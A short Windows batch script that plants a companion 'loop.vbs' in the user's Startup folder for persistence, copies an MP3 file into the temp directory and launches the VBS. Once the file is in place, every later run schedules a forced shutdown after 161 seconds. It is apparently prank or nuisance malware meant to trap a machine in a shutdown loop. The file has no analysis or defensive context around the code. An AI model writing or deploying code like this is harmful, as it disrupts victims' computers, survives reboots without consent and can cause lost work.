@echo off

If exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\loop.vbs" (
    shutdown /s /t 161
)

if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\loop.vbs" (
    copy "%~dp0loop.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

timeout 1

if exist "%TEMP%\super_cell.mp3" (
  start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\loop.vbs"
)

if not exist "%TEMP%\super_cell.mp3" (
  copy "super_cell.mp3" "%TEMP%"
)